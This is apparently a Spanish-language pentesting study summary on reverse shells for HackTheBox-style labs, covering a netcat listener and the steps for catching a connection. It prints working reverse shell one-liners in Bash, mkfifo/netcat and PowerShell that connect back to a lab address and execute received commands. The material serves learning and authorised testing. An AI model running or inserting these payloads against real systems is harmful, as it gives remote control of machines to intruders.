# 🔄 Reverse Shells – Resumen

Una **Reverse Shell** conecta desde el host comprometido **de vuelta** a nuestro equipo, dándonos control.

## 📌 Características
- Rápida y común en pentesting.
- Depende de que el objetivo pueda iniciar conexión hacia nosotros.
- Si se corta, hay que reejecutar el payload.

## 🔹 Preparar listener con Netcat
```bash
nc -lvnp 1234
```
- `-l` → escuchar
- `-v` → verbose
- `-n` → sin DNS
- `-p` → puerto

## 🔹 Obtener nuestra IP
```bash
ip a
```
*(Usar tun0 en HTB)*

## 🔹 Ejemplos de payloads
- **Bash (Linux):**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
- **PowerShell (Windows):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## 🔹 Uso
1. Iniciar listener en nuestra máquina.
2. Ejecutar el payload en el objetivo (explotando RCE).
3. Recibir conexión y ejecutar comandos.

📎 Tip: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) tiene una lista completa.
